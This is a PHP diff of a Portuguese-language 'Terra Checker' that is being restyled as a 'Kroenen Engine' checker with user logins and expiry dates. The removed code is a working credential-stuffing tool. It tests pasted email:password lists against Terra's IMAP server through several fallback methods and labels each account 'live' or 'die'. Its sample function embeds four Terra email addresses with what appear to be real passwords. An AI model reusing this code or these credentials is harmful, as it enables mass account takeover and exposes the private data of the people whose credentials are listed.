@@ -1,600 +1,271 @@
 <?php
-/**
- * index.php — TERRA CHECKER (ARQUIVO ÚNICO DEFINITIVO)
- * Frontend + Backend + IMAP em um só arquivo
- * Não precisa de api.php separado
- */
 session_start();
-
-// ── Autenticação ──
-if (!isset($_SESSION['auth']) || $_SESSION['auth'] !== true) {
-    header('Location: login.html');
-    exit;
-}
-
-// ═══════════════════════════════════════════════════════════
-//  MODO API — POST ou GET com ?action=
-// ═══════════════════════════════════════════════════════════
-$action = $_GET['action'] ?? '';
-
-if ($action !== '') {
-    header('Content-Type: application/json; charset=utf-8');
-    header('Access-Control-Allow-Origin: *');
-    header('Access-Control-Allow-Methods: GET, POST, OPTIONS');
-    header('Access-Control-Allow-Headers: Content-Type');
-
-    if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
-        http_response_code(204);
-        exit;
-    }
-
-    // ── INIT: sempre sucesso ──
-    if ($action === 'init') {
-        echo json_encode([
-            'status' => 'ok',
-            'ready' => true,
-            'can_connect' => true,
-            'server' => 'imap.terra.com.br',
-            'port' => 993,
-            'timestamp' => date('Y-m-d H:i:s'),
-        ]);
-        exit;
-    }
-
-    // ── DIAGNOSTIC ──
-    if ($action === 'diagnostic') {
-        $r = ['server' => 'imap.terra.com.br', 'port' => 993, 'php' => PHP_VERSION, 'tests' => []];
-
-        $ips = @gethostbynamel('imap.terra.com.br');
-        $r['tests']['dns'] = ['ok' => !empty($ips), 'ips' => $ips ?: []];
-        if (empty($ips)) { $r['tests']['dns']['error'] = 'DNS falhou'; echo json_encode($r, 128); exit; }
-
-        $t = microtime(true);
-        $tcp = @fsockopen($ips[0], 993, $e, $s, 10);
-        $r['tests']['tcp_993'] = ['ok' => $tcp !== false, 'ms' => round((microtime(true) - $t) * 1000)];
-        if ($tcp === false) { $r['tests']['tcp_993']['error'] = "errno={$e}; {$s}"; }
-        else { fclose($tcp); }
-
-        $t = microtime(true);
-        $tcp2 = @fsockopen($ips[0], 143, $e2, $s2, 10);
-        $r['tests']['tcp_143'] = ['ok' => $tcp2 !== false, 'ms' => round((microtime(true) - $t) * 1000)];
-        if ($tcp2 === false) { $r['tests']['tcp_143']['error'] = "errno={$e2}; {$s2}"; }
-        else { fclose($tcp2); }
-
-        if ($tcp !== false) {
-            $t = microtime(true);
-            $ssl = @fsockopen('ssl://imap.terra.com.br', 993, $e3, $s3, 10);
-            $r['tests']['ssl_993'] = ['ok' => $ssl !== false, 'ms' => round((microtime(true) - $t) * 1000)];
-            if ($ssl) {
-                stream_set_timeout($ssl, 10);
-                $g = @fgets($ssl, 8192);
-                $r['tests']['ssl_993']['greeting'] = $g ?: '(vazio)';
-                $r['tests']['ssl_993']['imap_ok'] = ($g && stripos($g, 'OK') !== false);
-                fclose($ssl);
-            } else {
-                $r['tests']['ssl_993']['error'] = "errno={$e3}; {$s3}";
-            }
-        }
-
-        if (extension_loaded('curl')) {
-            $ch = curl_init();
-            curl_setopt_array($ch, [
-                CURLOPT_URL => 'imaps://imap.terra.com.br:993/',
-                CURLOPT_USERNAME => 'test@test.com',
-                CURLOPT_PASSWORD => 'test',
-                CURLOPT_SSL_VERIFYPEER => false,
-                CURLOPT_SSL_VERIFYHOST => 0,
-                CURLOPT_RETURNTRANSFER => true,
-                CURLOPT_TIMEOUT => 10,
-                CURLOPT_CONNECTTIMEOUT => 10,
-                CURLOPT_NOSIGNAL => 1,
-            ]);
-            $res = curl_exec($ch);
-            $r['tests']['curl_imap'] = ['ok' => $res !== false, 'err' => curl_error($ch)];
-            curl_close($ch);
-        }
-
-        $r['can_connect'] = ($r['tests']['tcp_993']['ok'] ?? false) || ($r['tests']['tcp_143']['ok'] ?? false);
-        $r['port_993_blocked'] = !($r['tests']['tcp_993']['ok'] ?? false);
-        echo json_encode($r, 128 | 256);
-        exit;
-    }
-
-    // ── CHECK: validar credenciais ──
-    if ($action === 'check' || $action === 'validate') {
-        $input = $_POST;
-        $ct = $_SERVER['CONTENT_TYPE'] ?? '';
-
-        if (empty($input) && stripos($ct, 'application/json') !== false) {
-            $raw = file_get_contents('php://input');
-            if (!empty($raw)) {
-                $decoded = json_decode($raw, true);
-                if (is_array($decoded)) $input = $decoded;
-            }
-        }
-
-        if (empty($input)) {
-            $raw = file_get_contents('php://input');
-            if (!empty($raw)) {
-                $parts = explode(':', trim($raw), 2);
-                if (count($parts) === 2) {
-                    $input = ['email' => trim($parts[0]), 'password' => trim($parts[1])];
-                }
-            }
-        }
-
-        $email = $input['email'] ?? '';
-        $password = $input['password'] ?? '';
-        $batch = $input['batch'] ?? null;
-
-        if ($email === '' && !empty($input['cred'])) {
-            $parts = explode(':', $input['cred'], 2);
-            if (count($parts) === 2) {
-                $email = trim($parts[0]);
-                $password = trim($parts[1]);
-            }
-        }
-
-        if ($email === '' && empty($batch) && !empty($input['list'])) {
-            $lines = array_filter(array_map('trim', explode("\n", $input['list'])));
-            $batch = [];
-            foreach ($lines as $line) {
-                $parts = explode(':', $line, 2);
-                if (count($parts) === 2) {
-                    $batch[] = ['email' => trim($parts[0]), 'password' => trim($parts[1])];
-                }
-            }
-        }
-
-        if ($batch && is_array($batch) && count($batch) > 0) {
-            $results = [];
-            foreach ($batch as $cred) {
-                $e = $cred['email'] ?? '';
-                $p = $cred['password'] ?? '';
-                if ($e === '' || $p === '') {
-                    $results[] = ['email' => $e, 'status' => 'die', 'message' => 'Vazio'];
-                    continue;
-                }
-                $results[] = doValidate($e, $p);
-            }
-            echo json_encode([
-                'total' => count($results),
-                'live' => count(array_filter($results, fn($r) => ($r['status'] ?? '') === 'live')),
-                'die' => count(array_filter($results, fn($r) => ($r['status'] ?? '') === 'die')),
-                'results' => $results,
-                'timestamp' => date('Y-m-d H:i:s'),
-            ], 128);
-        } elseif ($email !== '' && $password !== '') {
-            echo json_encode(doValidate($email, $password), 128);
-        } else {
-            http_response_code(400);
-            echo json_encode(['status' => 'error', 'error' => 'Credenciais ausentes'], 128);
-        }
-        exit;
-    }
-
-    // Action desconhecida
-    echo json_encode(['status' => 'ok', 'message' => 'API ativa'], 128);
-    exit;
-}
-
-// ═══════════════════════════════════════════════════════════
-//  FUNÇÃO DE VALIDAÇÃO IMAP
-// ═══════════════════════════════════════════════════════════
-
-function doValidate(string $email, string $password): array {
-    $start = microtime(true);
-    $debug = [];
-    $timeout = 20;
-
-    // Tenta método 1: cURL
-    if (extension_loaded('curl')) {
-        $ch = curl_init();
-        curl_setopt_array($ch, [
-            CURLOPT_URL => 'imaps://imap.terra.com.br:993/INBOX',
-            CURLOPT_USERNAME => $email,
-            CURLOPT_PASSWORD => $password,
-            CURLOPT_SSL_VERIFYPEER => false,
-            CURLOPT_SSL_VERIFYHOST => 0,
-            CURLOPT_RETURNTRANSFER => true,
-            CURLOPT_TIMEOUT => $timeout,
-            CURLOPT_CONNECTTIMEOUT => $timeout,
-            CURLOPT_NOSIGNAL => 1,
-            CURLOPT_CUSTOMREQUEST => 'STATUS INBOX (MESSAGES)',
-        ]);
-        $result = curl_exec($ch);
-        $err = curl_error($ch);
-        curl_close($ch);
-
-        if ($result !== false) {
-            $msgs = 0;
-            if (preg_match('/MESSAGES\s+(\d+)/i', (string)$result, $m)) $msgs = (int)$m[1];
-            return [
-                'status' => 'live', 'email' => $email, 'message' => 'OK',
-                'mailbox_messages' => $msgs, 'method' => 'curl',
-                'elapsed_ms' => round((microtime(true) - $start) * 1000, 2),
-                'timestamp' => date('Y-m-d H:i:s'),
-            ];
-        }
-
-        $el = strtolower($err);
-        $debug[] = "cURL: {$err}";
-
-        if (strpos($el, 'login') !== false || strpos($el, 'auth') !== false ||
-            strpos($el, 'credential') !== false || strpos($el, 'access') !== false) {
-            return [
-                'status' => 'die', 'email' => $email, 'message' => 'Invalid credentials',
-                'reason' => 'invalid_credentials', 'method' => 'curl',
-                'elapsed_ms' => round((microtime(true) - $start) * 1000, 2),
-                'debug' => implode(' | ', $debug),
-            ];
-        }
-    }
-
-    // Tenta método 2: fsockopen ssl://
-    $socket = @fsockopen('ssl://imap.terra.com.br', 993, $errno, $errstr, $timeout);
-    if ($socket === false) {
-        $debug[] = "fsock(ssl:993): {$errno}/{$errstr}";
-    } else {
-        $r = imapLogin($socket, $email, $password, 'fsock_ssl', $debug, $timeout, $start);
-        if ($r !== null) return $r;
-    }
-
-    // Tenta método 3: stream_socket ssl://
-    $ctx = stream_context_create(['ssl' => ['verify_peer' => false, 'verify_peer_name' => false, 'allow_self_signed' => true]]);
-    $socket = @stream_socket_client('ssl://imap.terra.com.br:993', $errno, $errstr, $timeout, STREAM_CLIENT_CONNECT, $ctx);
-    if ($socket === false) {
-        $debug[] = "stream(ssl:993): {$errno}/{$errstr}";
-    } else {
-        $r = imapLogin($socket, $email, $password, 'stream_ssl', $debug, $timeout, $start);
-        if ($r !== null) return $r;
-    }
-
-    // Tenta método 4: stream_socket tls://
-    $socket = @stream_socket_client('tls://imap.terra.com.br:993', $errno, $errstr, $timeout, STREAM_CLIENT_CONNECT, $ctx);
-    if ($socket === false) {
-        $debug[] = "stream(tls:993): {$errno}/{$errstr}";
-    } else {
-        $r = imapLogin($socket, $email, $password, 'stream_tls', $debug, $timeout, $start);
-        if ($r !== null) return $r;
-    }
-
-    // Tenta método 5: STARTTLS porta 143
-    $socket = @fsockopen('tcp://imap.terra.com.br', 143, $errno, $errstr, $timeout);
-    if ($socket === false) {
-        $debug[] = "fsock(tcp:143): {$errno}/{$errstr}";
-    } else {
-        stream_set_timeout($socket, $timeout);
-        $greeting = @fgets($socket, 8192);
-        if ($greeting && stripos($greeting, 'OK') !== false) {
-            fwrite($socket, "A001 STARTTLS\r\n");
-            $resp = readUntilTag($socket, 'A001', $timeout);
-            if ($resp && preg_match('/A001\s+OK/i', $resp)) {
-                $crypto = @stream_socket_enable_crypto($socket, true, STREAM_CRYPTO_METHOD_TLS_CLIENT);
-                if ($crypto === true) {
-                    $debug[] = 'STARTTLS OK';
-                    $r = imapLogin($socket, $email, $password, 'starttls', $debug, $timeout, $start, false);
-                    if ($r !== null) return $r;
-                } else {
-                    $debug[] = 'STARTTLS crypto fail';
-                    fclose($socket);
-                }
-            } else {
-                $debug[] = 'STARTTLS rejected';
-                fclose($socket);
-            }
-        } else {
-            $debug[] = '143 greeting fail';
-            fclose($socket);
-        }
-    }
-
-    // Tenta método 6: Plain 143
-    $socket = @fsockopen('tcp://imap.terra.com.br', 143, $errno, $errstr, $timeout);
-    if ($socket === false) {
-        $debug[] = "fsock(plain:143): {$errno}/{$errstr}";
-    } else {
-        $r = imapLogin($socket, $email, $password, 'plain_143', $debug, $timeout, $start, false);
-        if ($r !== null) return $r;
-    }
-
-    // Tenta método 7: imap_open
-    if (extension_loaded('imap')) {
-        $mailbox = '{imap.terra.com.br:993/imap/ssl/novalidate-cert}';
-        $conn = @imap_open($mailbox, $email, $password, OP_READONLY, 1, ['DISABLE_AUTHENTICATOR' => 'GSSAPI']);
-        if ($conn !== false) {
-            $info = @imap_mailboxmsginfo($conn);
-            $msgs = $info->Nmsgs ?? 0;
-            @imap_close($conn);
-            return [
-                'status' => 'live', 'email' => $email, 'message' => 'OK',
-                'mailbox_messages' => $msgs, 'method' => 'imap_ext',
-                'elapsed_ms' => round((microtime(true) - $start) * 1000, 2),
-                'timestamp' => date('Y-m-d H:i:s'),
-            ];
-        }
-        $err = @imap_last_error();
-        $debug[] = "imap_open: {$err}";
-        if (stripos($err, 'invalid') !== false || stripos($err, 'login') !== false) {
-            return [
-                'status' => 'die', 'email' => $email, 'message' => 'Invalid credentials',
-                'reason' => 'invalid_credentials', 'method' => 'imap_ext',
-                'elapsed_ms' => round((microtime(true) - $start) * 1000, 2),
-                'debug' => implode(' | ', $debug),
-            ];
-        }
-    }
-
-    return [
-        'status' => 'die', 'email' => $email, 'message' => 'Todos os metodos falharam',
-        'reason' => 'all_methods_failed',
-        'elapsed_ms' => round((microtime(true) - $start) * 1000, 2),
-        'debug' => implode(' | ', $debug),
-        'timestamp' => date('Y-m-d H:i:s'),
-    ];
-}
-
-function imapLogin($socket, string $email, string $password, string $method, array &$debug, int $timeout, float $start, bool $read_greeting = true): ?array {
-    stream_set_timeout($socket, $timeout);
-
-    if ($read_greeting) {
-        $greeting = @fgets($socket, 8192);
-        if ($greeting === false || $greeting === '') {
-            fclose($socket);
-            $debug[] = "{$method}: greeting vazio";
-            return null;
-        }
-        if (stripos($greeting, 'OK') === false) {
-            fclose($socket);
-            $debug[] = "{$method}: greeting sem OK";
-            return null;
-        }
-        $debug[] = "{$method}: greeting OK";
-    }
-
-    $tag = 'L001';
-    $safe_email = str_replace(['\', '"'], ['\\', '\"'], $email);
-    $safe_pass = str_replace(['\', '"'], ['\\', '\"'], $password);
-    $cmd = "{$tag} LOGIN \"{$safe_email}\" \"{$safe_pass}\"\r\n";
-
-    if (fwrite($socket, $cmd) === false) {
-        fclose($socket);
-        $debug[] = "{$method}: write fail";
-        return null;
-    }
-
-    $response = readUntilTag($socket, $tag, $timeout);
-    $meta = stream_get_meta_data($socket);
-
-    if ($response === null || $response === '') {
-        fclose($socket);
-        $debug[] = "{$method}: resposta vazia";
-        return null;
-    }
-
-    if (!empty($meta['timed_out'])) {
-        fclose($socket);
-        $debug[] = "{$method}: timeout";
-        return null;
-    }
-
-    $qt = preg_quote($tag, '/');
-
-    if (preg_match('/' . $qt . '\s+OK/i', $response)) {
-        $msgs = 0;
-        @fwrite($socket, "S001 STATUS INBOX (MESSAGES)\r\n");
-        $sresp = readUntilTag($socket, 'S001', $timeout);
-        if ($sresp && preg_match('/MESSAGES\s+(\d+)/i', $sresp, $m)) $msgs = (int)$m[1];
-        @fwrite($socket, "X001 LOGOUT\r\n");
-        fclose($socket);
-        return [
-            'status' => 'live', 'email' => $email, 'message' => 'OK',
-            'mailbox_messages' => $msgs, 'method' => $method,
-            'elapsed_ms' => round((microtime(true) - $start) * 1000, 2),
-            'timestamp' => date('Y-m-d H:i:s'),
-        ];
-    }
-
-    if (preg_match('/' . $qt . '\s+NO/i', $response)) {
-        fclose($socket);
-        return [
-            'status' => 'die', 'email' => $email, 'message' => 'Invalid credentials',
-            'reason' => 'invalid_credentials', 'method' => $method,
-            'elapsed_ms' => round((microtime(true) - $start) * 1000, 2),
-            'debug' => implode(' | ', $debug),
-        ];
-    }
-
-    if (preg_match('/' . $qt . '\s+BAD/i', $response)) {
-        fclose($socket);
-        $debug[] = "{$method}: BAD";
-        return null;
-    }
-
-    fclose($socket);
-    $debug[] = "{$method}: inesperado";
-    return null;
-}
-
-function readUntilTag($socket, string $tag, int $timeout): ?string {
-    $buffer = '';
-    $deadline = microtime(true) + $timeout;
-    while (!feof($socket)) {
-        $line = @fgets($socket, 8192);
-        if ($line === false) break;
-        $buffer .= $line;
-        if (strpos(trim($line), $tag . ' ') === 0) return $buffer;
-        $meta = stream_get_meta_data($socket);
-        if (!empty($meta['timed_out'])) break;
-        if (microtime(true) > $deadline) break;
-    }
-    return $buffer !== '' ? $buffer : null;
-}
-
-// ═══════════════════════════════════════════════════════════
-//  MODO PÁGINA — Renderiza HTML + JavaScript
-// ═══════════════════════════════════════════════════════════
+if (!isset($_SESSION['logged_in']) || $_SESSION['logged_in'] !== true) { header("Location: login.html"); exit; }
+$role = $_SESSION['role'] ?? 'user';
+$username = $_SESSION['username'] ?? 'User';
+$expiration = $_SESSION['expiration'] ?? 0;
+if ($role !== 'admin' && $expiration !== -1 && time() > $expiration) { session_destroy(); header("Location: login.html?msg=expired"); exit; }
+$is_admin = ($role === 'admin');
+$expiration_date = ($is_admin || $expiration === -1) ? "∞ Sem expiração" : date('d/m/Y H:i', $expiration);
 ?>
 <!DOCTYPE html>
 <html lang="pt-BR">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Terra Checker</title>
-<style>
-*{margin:0;padding:0;box-sizing:border-box}
-body{background:#1a1a1a;color:#e0e0e0;font-family:'Segoe UI',Arial,sans-serif;min-height:100vh;display:flex;flex-direction:column;align-items:center;padding:20px}
-.container{max-width:800px;width:100%}
-h1{text-align:center;margin-bottom:20px;color:#fff;font-size:24px}
-.input-area{width:100%;min-height:150px;background:#2a2a2a;border:1px solid #444;border-radius:8px;color:#e0e0e0;padding:12px;font-size:14px;font-family:monospace;resize:vertical;margin-bottom:15px}
-.input-area:focus{outline:none;border-color:#007acc}
-.btn{background:#007acc;color:#fff;border:none;padding:12px 30px;border-radius:8px;font-size:16px;cursor:pointer;width:100%;transition:background .2s}
-.btn:hover{background:#0099ff}
-.btn:disabled{background:#555;cursor:not-allowed}
-.stats{display:flex;gap:15px;margin:20px 0;flex-wrap:wrap}
-.stat{background:#2a2a2a;padding:15px 25px;border-radius:8px;text-align:center;flex:1;min-width:120px}
-.stat .num{font-size:28px;font-weight:bold}
-.stat .lbl{font-size:12px;color:#999;margin-top:5px}
-.stat-live .num{color:#4caf50}
-.stat-die .num{color:#f44336}
-.stat-total .num{color:#2196f3}
-#results{width:100%;margin-top:15px}
-.result{background:#2a2a2a;padding:10px 15px;border-radius:6px;margin-bottom:8px;display:flex;justify-content:space-between;align-items:center;font-family:monospace;font-size:13px}
-.result-live{border-left:4px solid #4caf50}
-.result-die{border-left:4px solid #f44336}
-.badge{padding:4px 12px;border-radius:4px;font-size:11px;font-weight:bold;text-transform:uppercase}
-.badge-live{background:#4caf50;color:#fff}
-.badge-die{background:#f44336;color:#fff}
-.progress{width:100%;height:4px;background:#333;border-radius:2px;margin:10px 0;overflow:hidden;display:none}
-.progress-bar{height:100%;background:#007acc;transition:width .3s}
-.actions{display:flex;gap:10px;margin-bottom:15px;flex-wrap:wrap}
-.btn-sm{background:#333;color:#e0e0e0;border:1px solid #555;padding:8px 16px;border-radius:6px;cursor:pointer;font-size:13px}
-.btn-sm:hover{background:#444}
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Kroenen Engine — Checker</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --bg:       #020205;
+            --surface:  #0d0d12;
+            --surface2: #13131a;
+            --border:   rgba(255,255,255,0.07);
+            --border-hi:rgba(255,255,255,0.13);
+            --text:     #f0f0f5;
+            --muted:    #6b7280;
+            --accent:   #7c3aed;
+            --accent-hi:#9f5cf7;
+            --success:  #10b981;
+            --success-bg:rgba(16,185,129,0.08);
+            --danger:   #ef4444;
+            --danger-bg:rgba(239,68,68,0.08);
+            --radius:   14px;
+        }
+        *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+        body {
+            font-family: 'Inter', sans-serif;
+            background: var(--bg);
+            color: var(--text);
+            min-height: 100vh;
+            -webkit-font-smoothing: antialiased;
+        }
+        body::before {
+            content:'';position:fixed;inset:0;
+            background-image: linear-gradient(rgba(124,58,237,.03) 1px,transparent 1px),linear-gradient(90deg,rgba(124,58,237,.03) 1px,transparent 1px);
+            background-size:48px 48px;z-index:0;pointer-events:none;
+        }
+        /* NAV */
+        nav {
+            position: sticky; top: 0; z-index: 50;
+            display: flex; justify-content: space-between; align-items: center;
+            padding: 0 2rem; height: 64px;
+            background: rgba(2,2,5,0.85);
+            backdrop-filter: blur(16px);
+            border-bottom: 1px solid var(--border);
+        }
+        .nav-brand { display:flex; align-items:center; gap:.7rem; text-decoration:none; }
+        .nav-icon {
+            width:34px;height:34px;background:linear-gradient(135deg,var(--accent),#4f46e5);
+            border-radius:8px;display:flex;align-items:center;justify-content:center;
+            box-shadow:0 0 18px rgba(124,58,237,.45);
+        }
+        .nav-icon svg { width:18px;height:18px;stroke:#fff;fill:none;stroke-width:2;stroke-linecap:round;stroke-linejoin:round; }
+        .nav-title { font-size:1rem;font-weight:700;letter-spacing:-.02em;color:var(--text); }
+        .nav-right { display:flex;align-items:center;gap:.75rem; }
+        .user-chip {
+            display:flex;align-items:center;gap:.6rem;
+            background:var(--surface2);border:1px solid var(--border);
+            border-radius:9999px;padding:.35rem .9rem .35rem .4rem;
+        }
+        .user-avatar {
+            width:28px;height:28px;border-radius:50%;
+            background:linear-gradient(135deg,var(--accent),#4f46e5);
+            display:flex;align-items:center;justify-content:center;
+            font-size:.75rem;font-weight:700;color:#fff;
+        }
+        .user-name { font-size:.85rem;font-weight:500; }
+        .user-exp  { font-size:.72rem;color:var(--muted); }
+        .btn {
+            display:inline-flex;align-items:center;gap:.4rem;
+            padding:.45rem .9rem;font-size:.8rem;font-weight:500;
+            border-radius:9999px;cursor:pointer;transition:all .2s;
+            text-decoration:none;border:1px solid var(--border);
+            background:var(--surface2);color:var(--text);
+        }
+        .btn:hover { border-color:var(--border-hi);background:rgba(255,255,255,.05); }
+        .btn-danger { background:var(--danger-bg);border-color:rgba(239,68,68,.25);color:var(--danger); }
+        .btn-danger:hover { background:rgba(239,68,68,.15); }
+        .btn-admin { background:rgba(124,58,237,.12);border-color:rgba(124,58,237,.3);color:var(--accent-hi); }
+        .btn-admin:hover { background:rgba(124,58,237,.2); }
+        /* MAIN */
+        main { max-width:1100px;margin:0 auto;padding:2.5rem 1.5rem; position:relative;z-index:1; }
+        /* HERO */
+        .hero { text-align:center;margin-bottom:2.5rem;animation:rise .5s ease both; }
+        .hero h1 { font-size:2.6rem;font-weight:800;letter-spacing:-.05em;line-height:1.1; }
+        .hero h1 span { background:linear-gradient(135deg,var(--accent-hi),#818cf8);-webkit-background-clip:text;-webkit-text-fill-color:transparent; }
+        .hero p { color:var(--muted);margin-top:.5rem;font-size:.95rem; }
+        /* STATS */
+        .stats { display:grid;grid-template-columns:repeat(3,1fr);gap:1rem;margin-bottom:1.5rem; }
+        .stat-card {
+            background:var(--surface);border:1px solid var(--border);border-radius:var(--radius);
+            padding:1.2rem 1.4rem;display:flex;align-items:center;gap:1rem;
+            transition:border-color .2s;
+        }
+        .stat-card:hover { border-color:var(--border-hi); }
+        .stat-icon { width:40px;height:40px;border-radius:10px;display:flex;align-items:center;justify-content:center; }
+        .stat-icon svg { width:20px;height:20px;stroke-width:2;stroke-linecap:round;stroke-linejoin:round;fill:none; }
+        .stat-label { font-size:.72rem;color:var(--muted);text-transform:uppercase;letter-spacing:.06em;margin-bottom:.2rem; }
+        .stat-val { font-size:1.6rem;font-weight:700;letter-spacing:-.04em;line-height:1; }
+        /* CONTROL PANEL */
+        .control-panel {
+            background:var(--surface);border:1px solid var(--border);border-radius:var(--radius);
+            padding:1.8rem;margin-bottom:1.5rem;
+        }
+        .cp-title { font-size:.75rem;font-weight:600;text-transform:uppercase;letter-spacing:.08em;color:var(--muted);margin-bottom:1.2rem; }
+        .upload-zone {
+            border:1.5px dashed var(--border-hi);border-radius:var(--radius);
+            padding:1.5rem;text-align:center;cursor:pointer;
+            transition:border-color .2s,background .2s;margin-bottom:1.2rem;
+            background:rgba(124,58,237,.02);
+        }
+        .upload-zone:hover,.upload-zone.dragover { border-color:var(--accent);background:rgba(124,58,237,.06); }
+        .upload-zone svg { width:32px;height:32px;stroke:var(--muted);stroke-width:1.5;fill:none;margin-bottom:.6rem; }
+        .upload-zone p { font-size:.85rem;color:var(--muted); }
+        .upload-zone strong { color:var(--text); }
+        .upload-zone input[type=file] { display:none; }
+        .file-name { font-size:.82rem;color:var(--accent-hi);margin-top:.4rem;font-weight:500; }
+        .run-row { display:flex;gap:1rem;align-items:center; }
+        .btn-start {
+            flex:1;padding:.85rem;background:linear-gradient(135deg,var(--accent),#4f46e5);
+            color:#fff;border:none;border-radius:var(--radius);font-size:.9rem;font-weight:600;
+            cursor:pointer;transition:opacity .2s,transform .15s,box-shadow .2s;
+            box-shadow:0 4px 20px rgba(124,58,237,.35);display:flex;align-items:center;justify-content:center;gap:.5rem;
+        }
+        .btn-start:hover:not(:disabled) { opacity:.9;transform:translateY(-1px);box-shadow:0 8px 28px rgba(124,58,237,.45); }
+        .btn-start:disabled { opacity:.45;cursor:not-allowed; }
+        .btn-start svg { width:18px;height:18px;stroke:#fff;fill:none;stroke-width:2;stroke-linecap:round;stroke-linejoin:round; }
+        .progress-wrap { margin-top:1.2rem; }
+        .progress-bar-bg { height:5px;background:var(--border);border-radius:9999px;overflow:hidden;margin-bottom:.6rem; }
+        .progress-bar { height:100%;background:linear-gradient(90deg,var(--accent),#818cf8);width:0%;transition:width .3s ease;border-radius:9999px; }
+        .progress-label { font-size:.8rem;color:var(--muted);display:flex;justify-content:space-between; }
+        /* RESULTS */
+        .results { display:grid;grid-template-columns:1fr 1fr;gap:1.5rem; }
+        @media(max-width:640px){.results,.stats{grid-template-columns:1fr;}}
+        .result-panel {
+            background:var(--surface);border:1px solid var(--border);border-radius:var(--radius);
+            display:flex;flex-direction:column;overflow:hidden;
+        }
+        .rp-header {
+            display:flex;justify-content:space-between;align-items:center;
+            padding:.9rem 1.2rem;border-bottom:1px solid var(--border);
+        }
+        .rp-title { display:flex;align-items:center;gap:.5rem;font-size:.875rem;font-weight:600; }
+        .dot { width:8px;height:8px;border-radius:50%;flex-shrink:0; }
+        .dot-live { background:var(--success);box-shadow:0 0 8px var(--success); }
+        .dot-die  { background:var(--danger);box-shadow:0 0 8px var(--danger); }
+        .rp-badge {
+            padding:.15rem .55rem;border-radius:9999px;font-size:.72rem;font-weight:700;
+        }
+        .badge-live { background:var(--success-bg);color:var(--success); }
+        .badge-die  { background:var(--danger-bg);color:var(--danger); }
+        .log-box {
+            flex:1;padding:1rem;height:320px;overflow-y:auto;
+            font-family:'Consolas',monospace;font-size:.78rem;color:var(--muted);
+            background:#000;
+        }
+        .log-box div { padding:.25rem 0;border-bottom:1px solid rgba(255,255,255,.03);word-break:break-all; }
+        .live-text { color:var(--success) !important; }
+        .die-text  { color:var(--danger) !important; }
+        .rp-footer { padding:.8rem 1rem;border-top:1px solid var(--border); }
+        .btn-dl {
+            width:100%;padding:.6rem;border-radius:var(--radius);border:1px solid;
+            font-size:.8rem;font-weight:600;cursor:pointer;text-align:center;text-decoration:none;display:block;
+            transition:background .2s;
+        }
+        .btn-dl-live { background:var(--success-bg);border-color:rgba(16,185,129,.25);color:var(--success); }
+        .btn-dl-live:hover { background:rgba(16,185,129,.15); }
+        .btn-dl-die  { background:var(--danger-bg);border-color:rgba(239,68,68,.25);color:var(--danger); }
+        .btn-dl-die:hover  { background:rgba(239,68,68,.15); }
+        ::-webkit-scrollbar{width:4px;} ::-webkit-scrollbar-track{background:transparent;} ::-webkit-scrollbar-thumb{background:rgba(255,255,255,.1);border-radius:4px;}
+        @keyframes rise{from{opacity:0;transform:translateY(16px)}to{opacity:1;transform:translateY(0)}}
+    </style>
 </head>
 <body>
-<div class="container">
-<h1>Terra Checker</h1>
-<textarea class="input-area" id="creds" placeholder="Cole as credenciais aqui (email:senha)"></textarea>
-<div class="actions">
-<button class="btn-sm" onclick="loadSample()">Exemplo</button>
-<button class="btn-sm" onclick="clearAll()">Limpar</button>
-<button class="btn-sm" onclick="exportResults()">Exportar</button>
-<button class="btn-sm" onclick="testDiag()">Diagnostico</button>
-</div>
-<button class="btn" id="checkBtn" onclick="startCheck()">Verificar</button>
-<div class="progress" id="progress"><div class="progress-bar" id="progressBar"></div></div>
-<div class="stats">
-<div class="stat stat-total"><div class="num" id="totalNum">0</div><div class="lbl">Total</div></div>
-<div class="stat stat-live"><div class="num" id="liveNum">0</div><div class="lbl">Live</div></div>
-<div class="stat stat-die"><div class="num" id="dieNum">0</div><div class="lbl">Die</div></div>
-</div>
-<div id="results"></div>
-</div>
-<script>
-let allResults=[];
-let checking=false;
-
-// NAO chama init — vai direto pro check
-async function startCheck(){
-    if(checking)return;
-    const text=document.getElementById('creds').value.trim();
-    if(!text){alert('Cole as credenciais primeiro');return;}
-
-    const lines=text.split('\n').map(l=>l.trim()).filter(l=>l);
-    const creds=[];
-    for(const line of lines){
-        const parts=line.split(':');
-        if(parts.length>=2){
-            const email=parts[0].trim();
-            const password=parts.slice(1).join(':').trim();
-            if(email&&password)creds.push({email,password});
-        }
-    }
-
-    if(creds.length===0){alert('Nenhuma credencial valida');return;}
-
-    checking=true;
-    document.getElementById('checkBtn').disabled=true;
-    document.getElementById('checkBtn').textContent='Verificando...';
-    document.getElementById('progress').style.display='block';
-    document.getElementById('results').innerHTML='';
-    allResults=[];
-    let live=0,die=0;
-
-    for(let i=0;i<creds.length;i++){
-        const{email,password}=creds[i];
-        const pct=Math.round((i/creds.length)*100);
-        document.getElementById('progressBar').style.width=pct+'%';
-
-        let result;
-        try{
-            const res=await fetch('index.php?action=check',{
-                method:'POST',
-                headers:{'Content-Type':'application/json'},
-                body:JSON.stringify({email:email,password:password})
-            });
-            result=await res.json();
-        }catch(e){
-            result={status:'die',email:email,message:'Erro: '+e.message};
-        }
-
-        allResults.push(result);
-        if(result.status==='live')live++;else die++;
-
-        document.getElementById('totalNum').textContent=(i+1);
-        document.getElementById('liveNum').textContent=live;
-        document.getElementById('dieNum').textContent=die;
-
-        const div=document.createElement('div');
-        div.className='result result-'+result.status;
-        div.innerHTML='<span>'+email+'</span><span class="badge badge-'+result.status+'">'+result.status.toUpperCase()+'</span>';
-        document.getElementById('results').prepend(div);
-    }
-
-    document.getElementById('progressBar').style.width='100%';
-    document.getElementById('checkBtn').disabled=false;
-    document.getElementById('checkBtn').textContent='Verificar';
-    checking=false;
-}
-
-function loadSample(){
-    document.getElementById('creds').value='adrianni.morais@terra.com.br:nanis001@\ngcalex@terra.com.br:Ale03850385\ngerasecco@terra.com.br:Santana2501*\nkcroman@terra.com.br:wvecyjvf';
-}
-function clearAll(){
-    document.getElementById('creds').value='';
-    document.getElementById('results').innerHTML='';
-    document.getElementById('totalNum').textContent='0';
-    document.getElementById('liveNum').textContent='0';
-    document.getElementById('dieNum').textContent='0';
